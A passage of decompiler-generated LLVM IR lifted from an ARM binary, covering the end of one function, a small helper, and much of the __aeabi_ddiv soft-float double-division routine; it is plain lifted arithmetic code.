  %v7_17010 = lshr i32 %v1_1700c, %v2_16f84
  %v8_17010 = sub i32 -1, %v7_17010
  %v9_17010 = and i32 %v6_17008, %v8_17010
  %tmp24 = icmp slt i32 %v8_17004, 0
  %v4_17014 = zext i1 %tmp24 to i32
  %v5_17014 = add i32 %v4_17014, %v9_17010
  %v3_17018 = mul i32 %v8_17004, 2
  %v4_17018 = or i32 %v8_16ffc, %v3_17018
  %v5_17018 = icmp slt i32 %v4_17018, 0
  store i1 %v5_17018, i1* @cpsr_n, align 1
  %v6_17018 = icmp eq i32 %v4_17018, 0
  store i1 %v6_17018, i1* @cpsr_z, align 1
  br i1 %v6_17018, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_16ff8
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1701c = add nsw i32 %tmp25, -1
  %v7_1701c = and i32 %v5_17014, %v6_1701c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16ff8, %bb17
  %v1_17024 = phi i32 [ %v5_17014, %dec_label_pc_16ff8 ], [ %v7_1701c, %bb17 ]
  %v2_17020 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17020, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_17024

dec_label_pc_170e4:                               ; preds = %dec_label_pc_16f68
  %v0_170e4 = load i32, i32* @r1, align 4
  %v1_170e4 = and i32 %v0_170e4, -2147483648
  %v1_170ec = or i32 %v1_170e4, 2146435072
  store i32 %v1_170ec, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_17014, { 1, 0 }
  uselistorder i32 %v5_16fe0, { 1, 0, 2 }
  uselistorder i32 %v8_16fd8, { 1, 0 }
  uselistorder i32 %v1_16fc8, { 1, 0 }
  uselistorder i32 %v5_16fb0, { 1, 0 }
  uselistorder i32 %v1_16fa4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16f98, { 1, 0 }
  uselistorder i32 %v2_16f84, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_16f80, { 1, 0 }
  uselistorder i32 %v4_16f6c, { 1, 2, 0 }
  uselistorder i32 %v0_16f6c, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 12, 8, 13, 14, 0, 9, 2, 10, 1 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_170fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_170fc:
  %v1_17100 = or i32 %arg1, 2146959360
  store i32 %v1_17100, i32* @r1, align 4
  %v1_17108 = load i32, i32* @r0, align 4
  ret i32 %v1_17108
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1710c = load i32, i32* @r4, align 4
  store i32 %v3_1710c, i32* %stack_var_-16, align 4
  %v6_1710c = load i32, i32* @r5, align 4
  %v9_1710c = load i32, i32* @r6, align 4
  %v12_1710c = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_17118 = load i32, i32* @r1, align 4
  %v4_17118 = udiv i32 %v1_17118, 1048576
  %v5_17118 = urem i32 %v4_17118, 2048
  store i32 %v5_17118, i32* @r4, align 4
  %v6_17118 = icmp eq i32 %v5_17118, 0
  br i1 %v6_17118, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1711c = udiv i32 %arg4, 1048576
  %v6_1711c = urem i32 %v5_1711c, 2048
  store i32 %v6_1711c, i32* %r5.global-to-local, align 4
  %v7_1711c = icmp eq i32 %v6_1711c, 0
  br i1 %v7_1711c, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_172a8

bb90:                                             ; preds = %bb
  %v5_17120 = icmp eq i32 %v5_17118, 2047
  br i1 %v5_17120, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1711c, %bb90 ]
  br label %dec_label_pc_172a8

bb91:                                             ; preds = %bb90
  %v5_17124 = icmp eq i32 %v6_1711c, 2047
  br i1 %v5_17124, label %dec_label_pc_172a8, label %dec_label_pc_1712c

dec_label_pc_1712c:                               ; preds = %bb91
  %v2_1712c = sub nsw i32 %v5_17118, %v6_1711c
  store i32 %v2_1712c, i32* %r4.global-to-local, align 4
  %v2_17130 = xor i32 %v1_17118, %arg4
  %v4_17134 = mul i32 %arg4, 4096
  %v5_17134 = or i32 %v4_17134, %arg3
  store i32 %v5_17134, i32* %r5.global-to-local, align 4
  %v7_17134 = icmp eq i32 %v5_17134, 0
  %v3_17138 = mul i32 %v1_17118, 4096
  store i32 %v3_17138, i32* %r1.global-to-local, align 4
  br i1 %v7_17134, label %dec_label_pc_17274, label %dec_label_pc_17140

dec_label_pc_17140:                               ; preds = %dec_label_pc_1712c
  %tmp92 = mul i32 %arg4, 256
  %v4_17148 = and i32 %tmp92, 268435200
  %v4_1714c = udiv i32 %arg3, 16777216
  %v5_17148 = or i32 %v4_1714c, %v4_17148
  %v5_1714c = or i32 %v5_17148, 268435456
  store i32 %v5_1714c, i32* %r3.global-to-local, align 4
  %v3_17150 = mul i32 %arg3, 256
  store i32 %v3_17150, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_17118, 256
  %v4_17154 = and i32 %tmp93, 268435200
  %v1_17158 = load i32, i32* @r0, align 4
  %v4_17158 = udiv i32 %v1_17158, 16777216
  %v5_17154 = or i32 %v4_17154, %v4_17158
  %v5_17158 = or i32 %v5_17154, 268435456
  store i32 %v5_17158, i32* %r5.global-to-local, align 4
  %v3_1715c = mul i32 %v1_17158, 256
  store i32 %v3_1715c, i32* %r6.global-to-local, align 4
  %v1_17160 = and i32 %v2_17130, -2147483648
  store i32 %v1_17160, i32* %r1.global-to-local, align 4
  %v3_17164 = icmp uge i32 %v5_17158, %v5_1714c
  %v9_17164 = icmp eq i32 %v5_17158, %v5_1714c
  br i1 %v9_17164, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_17140
  %v4_17168 = icmp uge i32 %v3_1715c, %v3_17150
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_17140, %bb94
  %v1_1716c = phi i1 [ %v3_17164, %dec_label_pc_17140 ], [ %v4_17168, %bb94 ]
  %v2_1716c = add nsw i32 %v2_1712c, 253
  %v3_1716c = zext i1 %v1_1716c to i32
  %v4_1716c = add nsw i32 %v2_1716c, %v3_1716c
  %v8_1716c = icmp ule i32 %v4_1716c, %v2_1712c
  %v9_1716c = icmp ugt i32 %v2_1712c, -254
  %v10_1716c = select i1 %v1_1716c, i1 %v8_1716c, i1 %v9_1716c
  %v1_17170 = add nsw i32 %v4_1716c, 768
  store i32 %v1_17170, i32* %r4.global-to-local, align 4
  br i1 %v10_1716c, label %dec_label_pc_17180, label %dec_label_pc_17178

dec_label_pc_17178:                               ; preds = %bb95
  %v3_17178 = udiv i32 %v5_1714c, 2
  store i32 %v3_17178, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %bb95, %dec_label_pc_17178
  %v0_17188 = phi i32 [ %v5_1714c, %bb95 ], [ %v3_17178, %dec_label_pc_17178 ]
  %v0_1718c = phi i32 [ %v3_17150, %bb95 ], [ 0, %dec_label_pc_17178 ]
  %v2_17180 = sub i32 %v3_1715c, %v0_1718c
  store i32 %v2_17180, i32* %r6.global-to-local, align 4
  %v3_17180 = icmp uge i32 %v3_1715c, %v0_1718c
  %v3_17184 = icmp eq i1 %v3_17180, false
  %v4_17184 = sub nsw i32 %v5_17158, %v0_17188
  %v6_17184 = sext i1 %v3_17184 to i32
  %v7_17184 = add nsw i32 %v6_17184, %v4_17184
  store i32 %v7_17184, i32* %r5.global-to-local, align 4
  %v3_17188 = udiv i32 %v0_17188, 2
  store i32 %v3_17188, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17198.outer

dec_label_pc_17198.outer:                         ; preds = %dec_label_pc_17230, %dec_label_pc_17180
  %v1_17244.ph = phi i32 [ %v2_17230, %dec_label_pc_17230 ], [ %v1_17160, %dec_label_pc_17180 ]
  %v0_1719c.ph = phi i32 [ %v5_1720c, %dec_label_pc_17230 ], [ %v7_17184, %dec_label_pc_17180 ]
  %v1_171a0.ph = phi i32 [ %v3_17210, %dec_label_pc_17230 ], [ %v2_17180, %dec_label_pc_17180 ]
  %v5_1721817.ph = phi i32 [ %v5_17218, %dec_label_pc_17230 ], [ %v3_17188, %dec_label_pc_17180 ]
  %v3_1721c13.ph = phi i32 [ %v3_1721c, %dec_label_pc_17230 ], [ 0, %dec_label_pc_17180 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_17230 ], [ 1048576, %dec_label_pc_17180 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_17230 ], [ 524288, %dec_label_pc_17180 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17198

dec_label_pc_17198:                               ; preds = %dec_label_pc_17198.outer, %dec_label_pc_17208
  %v1_171fc59 = phi i32 [ %v2_17244, %dec_label_pc_17208 ], [ %storemerge133, %dec_label_pc_17198.outer ]
  %v1_171a8 = phi i32 [ %v1_171a832, %dec_label_pc_17208 ], [ %storemerge133, %dec_label_pc_17198.outer ]
  %v1_171c441 = phi i32 [ %v1_171c443, %dec_label_pc_17208 ], [ %storemerge133, %dec_label_pc_17198.outer ]
  %v1_171e050 = phi i32 [ %v1_171e052, %dec_label_pc_17208 ], [ %storemerge133, %dec_label_pc_17198.outer ]
  %v0_17220 = phi i32 [ %v3_17220, %dec_label_pc_17208 ], [ %storemerge, %dec_label_pc_17198.outer ]
  %v0_1719c = phi i32 [ %v5_1720c, %dec_label_pc_17208 ], [ %v0_1719c.ph, %dec_label_pc_17198.outer ]
  %v1_171a0 = phi i32 [ %v3_17210, %dec_label_pc_17208 ], [ %v1_171a0.ph, %dec_label_pc_17198.outer ]
  %v5_1721817 = phi i32 [ %v5_17218, %dec_label_pc_17208 ], [ %v5_1721817.ph, %dec_label_pc_17198.outer ]
  %v3_1721c13 = phi i32 [ %v3_1721c, %dec_label_pc_17208 ], [ %v3_1721c13.ph, %dec_label_pc_17198.outer ]
  %v3_17198 = icmp uge i32 %v1_171a0, %v3_1721c13
  %v3_1719c = icmp eq i1 %v3_17198, false
  %v4_1719c = sub i32 %v0_1719c, %v5_1721817
  %v6_1719c = sext i1 %v3_1719c to i32
  %v7_1719c = add i32 %v6_1719c, %v4_1719c
  %v8_1719c = zext i1 %v3_1719c to i32
  %v9_1719c = sub i32 %v7_1719c, %v8_1719c
  %v10_1719c = icmp ult i32 %v0_1719c, %v9_1719c
  %v11_1719c = icmp ne i32 %v5_1721817, -1
  %v12_1719c = or i1 %v11_1719c, %v10_1719c
  %v13_1719c = icmp ult i32 %v0_1719c, %v5_1721817
  %v14_1719c = select i1 %v3_1719c, i1 %v12_1719c, i1 %v13_1719c
  br i1 %v14_1719c, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_17198
  %v3_171a0 = sub i32 %v1_171a0, %v3_1721c13
  store i32 %v3_171a0, i32* %r6.global-to-local, align 4
  store i32 %v7_1719c, i32* %r5.global-to-local, align 4
  %v3_171a8 = or i32 %v1_171a8, %v0_17220
  store i32 %v3_171a8, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17198, %bb96
  %v1_171fc58 = phi i32 [ %v1_171fc59, %dec_label_pc_17198 ], [ %v3_171a8, %bb96 ]
  %v1_171a835 = phi i32 [ %v1_171a8, %dec_label_pc_17198 ], [ %v3_171a8, %bb96 ]
  %v1_171c4 = phi i32 [ %v1_171c441, %dec_label_pc_17198 ], [ %v3_171a8, %bb96 ]
  %v1_171e049 = phi i32 [ %v1_171e050, %dec_label_pc_17198 ], [ %v3_171a8, %bb96 ]
  %v0_171b8 = phi i32 [ %v0_1719c, %dec_label_pc_17198 ], [ %v7_1719c, %bb96 ]
  %v1_171bc = phi i32 [ %v1_171a0, %dec_label_pc_17198 ], [ %v3_171a0, %bb96 ]
  %v1_171ac = urem i32 %v5_1721817, 2
  %v2_171ac = icmp ne i32 %v1_171ac, 0
  %v3_171ac = udiv i32 %v5_1721817, 2
  %v3_171b0 = zext i1 %v2_171ac to i32
  %v6_171b0 = zext i32 %v3_1721c13 to i64
  %v7_171b0 = sub i32 33, %v3_1721c13
  %v8_171b0 = zext i32 %v7_171b0 to i64
  %v9_171b0 = shl i64 %v6_171b0, %v8_171b0
  %v10_171b0 = sub i32 32, %v3_1721c13
  %v11_171b0 = shl i32 %v3_171b0, %v10_171b0
  %v12_171b0 = zext i32 %v11_171b0 to i64
  %v14_171b0 = or i64 %v12_171b0, %v9_171b0
  %v15_171b0 = trunc i64 %v14_171b0 to i32
  %v3_171b4 = icmp uge i32 %v1_171bc, %v15_171b0
  %v3_171b8 = icmp eq i1 %v3_171b4, false
  %v4_171b8 = sub i32 %v0_171b8, %v3_171ac
  %v6_171b8 = sext i1 %v3_171b8 to i32
  %v7_171b8 = add i32 %v6_171b8, %v4_171b8
  %v13_171b8 = icmp ult i32 %v0_171b8, %v3_171ac
  %v14_171b8 = or i1 %v13_171b8, %v3_171b8
  br i1 %v14_171b8, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_171bc = sub i32 %v1_171bc, %v15_171b0
  store i32 %v3_171bc, i32* %r6.global-to-local, align 4
  store i32 %v7_171b8, i32* %r5.global-to-local, align 4
  %v5_171c4 = udiv i32 %v0_17220, 2
  %v6_171c4 = or i32 %v1_171c4, %v5_171c4
  store i32 %v6_171c4, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_171fc57 = phi i32 [ %v1_171fc58, %.thread4 ], [ %v6_171c4, %bb97 ]
  %v1_171a834 = phi i32 [ %v1_171a835, %.thread4 ], [ %v6_171c4, %bb97 ]
  %v1_171c445 = phi i32 [ %v1_171c4, %.thread4 ], [ %v6_171c4, %bb97 ]
  %v1_171e0 = phi i32 [ %v1_171e049, %.thread4 ], [ %v6_171c4, %bb97 ]
  %v0_171d4 = phi i32 [ %v0_171b8, %.thread4 ], [ %v7_171b8, %bb97 ]
  %v1_171d8 = phi i32 [ %v1_171bc, %.thread4 ], [ %v3_171bc, %bb97 ]
  %v1_171c8 = urem i32 %v3_171ac, 2
  %v2_171c8 = icmp ne i32 %v1_171c8, 0
  %v3_171c8 = udiv i32 %v5_1721817, 4
  %v3_171cc = zext i1 %v2_171c8 to i32
  %v6_171cc = and i64 %v14_171b0, 4294967295
  %v7_171cc = sub i32 33, %v15_171b0
  %v8_171cc = zext i32 %v7_171cc to i64
  %v9_171cc = shl i64 %v6_171cc, %v8_171cc
  %v10_171cc = sub i32 32, %v15_171b0
  %v11_171cc = shl i32 %v3_171cc, %v10_171cc
  %v12_171cc = zext i32 %v11_171cc to i64
  %v14_171cc = or i64 %v12_171cc, %v9_171cc
  %v15_171cc = trunc i64 %v14_171cc to i32
  %v3_171d0 = icmp uge i32 %v1_171d8, %v15_171cc
  %v3_171d4 = icmp eq i1 %v3_171d0, false
  %v4_171d4 = sub i32 %v0_171d4, %v3_171c8
  %v6_171d4 = sext i1 %v3_171d4 to i32
  %v7_171d4 = add i32 %v6_171d4, %v4_171d4
  %v13_171d4 = icmp ult i32 %v0_171d4, %v3_171c8
  %v14_171d4 = or i1 %v13_171d4, %v3_171d4
  br i1 %v14_171d4, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_171d8 = sub i32 %v1_171d8, %v15_171cc
  store i32 %v3_171d8, i32* %r6.global-to-local, align 4
  store i32 %v7_171d4, i32* %r5.global-to-local, align 4
  %v5_171e0 = udiv i32 %v0_17220, 4
  %v6_171e0 = or i32 %v1_171e0, %v5_171e0
  store i32 %v6_171e0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_171fc = phi i32 [ %v1_171fc57, %.thread6 ], [ %v6_171e0, %bb98 ]
  %v1_171a833 = phi i32 [ %v1_171a834, %.thread6 ], [ %v6_171e0, %bb98 ]
  %v1_171c444 = phi i32 [ %v1_171c445, %.thread6 ], [ %v6_171e0, %bb98 ]
  %v1_171e053 = phi i32 [ %v1_171e0, %.thread6 ], [ %v6_171e0, %bb98 ]
  %v0_171f0 = phi i32 [ %v0_171d4, %.thread6 ], [ %v7_171d4, %bb98 ]
  %v1_171f4 = phi i32 [ %v1_171d8, %.thread6 ], [ %v3_171d8, %bb98 ]
  %v1_171e4 = urem i32 %v3_171c8, 2
  %v2_171e4 = icmp ne i32 %v1_171e4, 0
  %v3_171e4 = udiv i32 %v5_1721817, 8
  %v3_171e8 = zext i1 %v2_171e4 to i32
  %v6_171e8 = and i64 %v14_171cc, 4294967295
  %v7_171e8 = sub i32 33, %v15_171cc
  %v8_171e8 = zext i32 %v7_171e8 to i64
  %v9_171e8 = shl i64 %v6_171e8, %v8_171e8
  %v10_171e8 = sub i32 32, %v15_171cc
  %v11_171e8 = shl i32 %v3_171e8, %v10_171e8
  %v12_171e8 = zext i32 %v11_171e8 to i64
  %v14_171e8 = or i64 %v12_171e8, %v9_171e8
  %v15_171e8 = trunc i64 %v14_171e8 to i32
  %v3_171ec = icmp uge i32 %v1_171f4, %v15_171e8
  %v3_171f0 = icmp eq i1 %v3_171ec, false
  %v4_171f0 = sub i32 %v0_171f0, %v3_171e4
  %v6_171f0 = sext i1 %v3_171f0 to i32
  %v7_171f0 = add i32 %v6_171f0, %v4_171f0
  %v13_171f0 = icmp ult i32 %v0_171f0, %v3_171e4
  %v14_171f0 = or i1 %v13_171f0, %v3_171f0
  br i1 %v14_171f0, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_171f4 = sub i32 %v1_171f4, %v15_171e8
  store i32 %v3_171f4, i32* %r6.global-to-local, align 4
  store i32 %v7_171f0, i32* %r5.global-to-local, align 4
  %v5_171fc = udiv i32 %v0_17220, 8
  %v6_171fc = or i32 %v1_171fc, %v5_171fc
  store i32 %v6_171fc, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1720c = phi i32 [ %v1_171f4, %.thread8 ], [ %v3_171f4, %bb100 ]
  %v0_17208 = phi i32 [ %v0_171f0, %.thread8 ], [ %v7_171f0, %bb100 ]
  %v2_17244 = phi i32 [ %v1_171fc, %.thread8 ], [ %v6_171fc, %bb100 ]
  %v1_171a832 = phi i32 [ %v1_171a833, %.thread8 ], [ %v6_171fc, %bb100 ]
  %v1_171c443 = phi i32 [ %v1_171c444, %.thread8 ], [ %v6_171fc, %bb100 ]
  %v1_171e052 = phi i32 [ %v1_171e053, %.thread8 ], [ %v6_171fc, %bb100 ]
  %v2_17200 = or i32 %v0_17208, %v1_1720c
  %v4_17200 = icmp eq i32 %v2_17200, 0
  br i1 %v4_17200, label %dec_label_pc_17240, label %dec_label_pc_17208

dec_label_pc_17208:                               ; preds = %.thread10
  %v3_17208 = mul i32 %v0_17208, 16
  %v4_1720c = udiv i32 %v1_1720c, 268435456
  %v5_1720c = or i32 %v3_17208, %v4_1720c
  store i32 %v5_1720c, i32* %r5.global-to-local, align 4
  %v3_17210 = mul i32 %v1_1720c, 16
  store i32 %v3_17210, i32* %r6.global-to-local, align 4
  %v3_17214 = mul nuw i32 %v3_171e4, 8
  %v4_17218 = udiv i32 %v15_171e8, 536870912
  %v5_17218 = or i32 %v4_17218, %v3_17214
  %v3_1721c = mul i32 %v15_171e8, 8
  %v3_17220 = udiv i32 %v0_17220, 16
  store i32 %v3_17220, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17220, 16
  br i1 %tmp, label %dec_label_pc_17228, label %dec_label_pc_17198

dec_label_pc_17228:                               ; preds = %dec_label_pc_17208
  %v1_17228 = and i32 %v1_17244.ph, 1048576
  %v2_17228 = icmp eq i32 %v1_17228, 0
  br i1 %v2_17228, label %dec_label_pc_17230, label %.thread11.loopexit

dec_label_pc_17230:                               ; preds = %dec_label_pc_17228
  %v2_17230 = or i32 %v2_17244, %v1_17244.ph
  store i32 %v2_17230, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17198.outer

dec_label_pc_17240:                               ; preds = %.thread10
  store i32 %v15_171e8, i32* %r2.global-to-local, align 4
  store i32 %v3_171e4, i32* %r3.global-to-local, align 4
  %v1_17240 = and i32 %v1_17244.ph, 1048576
  %v2_17240 = icmp eq i32 %v1_17240, 0
  br i1 %v2_17240, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_17240
  %v3_17244 = or i32 %v2_17244, %v1_17244.ph
  store i32 %v3_17244, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_17228
  store i32 %v3_1721c, i32* %r2.global-to-local, align 4
  store i32 %v5_17218, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_17240, %bb101
  %v1_1724c = add nsw i32 %v4_1716c, 515
  store i32 %v1_1724c, i32* %ip.global-to-local, align 4
  %v2_1724c = icmp ugt i32 %v1_17170, 252
  %v7_1724c = icmp eq i32 %v1_17170, 253
  %v2_17250 = xor i1 %v7_1724c, true
  %v3_17250 = and i1 %v2_1724c, %v2_17250
  br i1 %v3_17250, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_17250 = icmp ugt i32 %v1_1724c, 1791
  %v11_17250 = icmp eq i32 %v1_1724c, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_17254 = phi i1 [ %v7_1724c, %.thread11 ], [ %v11_17250, %bb102 ]
  %v0_17254 = phi i1 [ %v2_1724c, %.thread11 ], [ %v6_17250, %bb102 ]
  %v2_17254 = xor i1 %v1_17254, true
  %v3_17254 = and i1 %v0_17254, %v2_17254
  call void @__pseudo_cond_branch(i1 %v3_17254, i32 ptrtoint (i32* @global_var_16f68.593 to i32))
  %v0_17258 = load i32, i32* %r5.global-to-local, align 4
  %v1_17258 = load i32, i32* %r3.global-to-local, align 4
  %v2_17258 = sub i32 %v0_17258, %v1_17258
  store i32 %v2_17258, i32* %ip.global-to-local, align 4
  %v3_17258 = icmp uge i32 %v0_17258, %v1_17258
  %v9_17258 = icmp eq i32 %v0_17258, %v1_17258
  br i1 %v9_17258, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1725c = load i32, i32* %r6.global-to-local, align 4
  %v2_1725c = load i32, i32* %r2.global-to-local, align 4
  %v3_1725c = sub i32 %v1_1725c, %v2_1725c
  store i32 %v3_1725c, i32* %ip.global-to-local, align 4
  %v4_1725c = icmp uge i32 %v1_1725c, %v2_1725c
  %v10_1725c = icmp eq i32 %v1_1725c, %v2_1725c
  br i1 %v10_1725c, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_17260 = load i32, i32* %r0.global-to-local, align 4
  %v2_17260 = urem i32 %v1_17260, 2
  %v3_17260 = icmp ne i32 %v2_17260, 0
  %v4_17260 = udiv i32 %v1_17260, 2
  store i32 %v4_17260, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_17264 = phi i1 [ %v3_17258, %bb103 ], [ %v4_1725c, %bb104 ], [ %v3_17260, %bb105 ]
  %v0_17264 = load i32, i32* %r0.global-to-local, align 4
  %v2_17264 = zext i1 %v1_17264 to i32
  %v3_17264 = add i32 %v2_17264, %v0_17264
  store i32 %v3_17264, i32* %r0.global-to-local, align 4
  %v0_17268 = load i32, i32* %r1.global-to-local, align 4
  %v1_17268 = load i32, i32* %r4.global-to-local, align 4
  %v2_17268 = and i32 %v1_17268, 4096
  %v3_17268 = icmp ne i32 %v2_17268, 0
  %v4_17268 = mul i32 %v1_17268, 1048576
  %v6_17268 = add i32 %v4_17268, %v0_17268
  %v7_17268 = zext i1 %v3_17268 to i32
  %v8_17268 = add i32 %v7_17268, %v6_17268
  store i32 %v8_17268, i32* %r1.global-to-local, align 4
  %v2_1726c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1726c, i32* %r4.global-to-local, align 4
  store i32 %v6_1710c, i32* %r5.global-to-local, align 4
  store i32 %v9_1710c, i32* %r6.global-to-local, align 4
  ret i32 %v3_17264

dec_label_pc_17274:                               ; preds = %dec_label_pc_1712c
  %v1_17274 = and i32 %v2_17130, -2147483648
  %v4_17278 = urem i32 %v1_17118, 1048576
  %v5_17278 = or i32 %v1_17274, %v4_17278
  store i32 %v5_17278, i32* %r1.global-to-local, align 4
  %v6_1727c = add nsw i32 %v2_1712c, 1023
  store i32 %v6_1727c, i32* %r4.global-to-local, align 4
  %v8_1727c = sub nsw i32 0, %v2_1712c
  %v9_1727c = and i32 %v6_1727c, %v8_1727c
  %v11_1727c = icmp slt i32 %v2_1712c, -1023
  %v12_1727c = icmp eq i32 %v6_1727c, 0
  %v7_17280 = icmp sgt i32 %v2_1712c, -1023
  br i1 %v7_17280, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_17274
  %v10_17280 = sub nsw i32 1024, %v2_1712c
  store i32 %v10_17280, i32* %r5.global-to-local, align 4
  %v14_17280 = and i32 %v10_17280, %v6_1727c
  %v16_17280 = icmp slt i32 %v10_17280, 0
  %v17_17280 = icmp eq i32 %v6_1727c, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_17274, %bb106
  %v3_1728c.in = phi i32 [ %v9_1727c, %dec_label_pc_17274 ], [ %v14_17280, %bb106 ]
  %v2_1728c = phi i1 [ %v11_1727c, %dec_label_pc_17274 ], [ %v16_17280, %bb106 ]
  %v1_1728c = phi i1 [ %v12_1727c, %dec_label_pc_17274 ], [ %v17_17280, %bb106 ]
  %v3_1728c = icmp slt i32 %v3_1728c.in, 0
  %v3_17284 = xor i1 %v3_1728c, %v2_1728c
  %v4_17284 = or i1 %v1_1728c, %v3_17284
  br i1 %v4_17284, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1728484 = mul i32 %v6_1727c, 1048576
  %v10_1728485 = or i32 %v9_1728484, %v5_17278
  store i32 %v10_1728485, i32* %r1.global-to-local, align 4
  store i32 %v3_1710c, i32* %r4.global-to-local, align 4
  store i32 %v6_1710c, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1728c = phi i32 [ %v12_1710c, %bb108 ], [ %v1_17274, %bb107 ]
  %v6_1728c = xor i1 %v4_17284, true
  call void @__pseudo_cond_branch(i1 %v6_1728c, i32 %v0_1728c)
  %v0_17290 = load i32, i32* %r1.global-to-local, align 4
  %v1_17290 = or i32 %v0_17290, 1048576
  store i32 %v1_17290, i32* @r1, align 4
  %v0_17298 = load i32, i32* %r4.global-to-local, align 4
  %v1_17298 = add i32 %v0_17298, -1
  store i32 %v1_17298, i32* @r4, align 4
  %v3_17298 = sub i32 0, %v0_17298
  %v4_17298 = and i32 %v0_17298, %v3_17298
  %v5_17298 = icmp slt i32 %v4_17298, 0
  store i1 %v5_17298, i1* @cpsr_v, align 1
  %v6_17298 = icmp slt i32 %v1_17298, 0
  store i1 %v6_17298, i1* @cpsr_n, align 1
  %v7_17298 = icmp eq i32 %v0_17298, 1
  store i1 %v7_17298, i1* @cpsr_z, align 1
  %v0_1729c = call i32 @function_16f68()
  store i32 %v0_1729c, i32* @r0, align 4
  %v0_172a4 = call i32 @function_16f68()
  store i32 %v0_172a4, i32* @r0, align 4
  %v0_172a8.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_172ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_172a8

dec_label_pc_172a8:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_172a8.pre-phi = phi i32 [ %v5_1711c, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1711c, %bb91 ], [ %v5_1711c, %.thread ]
  %v0_172ac = phi i32 [ %v5_17118, %.thread1 ], [ %v5_17118, %.thread2 ], [ %v5_17118, %bb91 ], [ %v0_172ac.pre, %.thread ]
  %v2_172b0 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_172a8.pre, %.thread ]
  %v5_172a8 = and i32 %v2_172b0, %v4_172a8.pre-phi
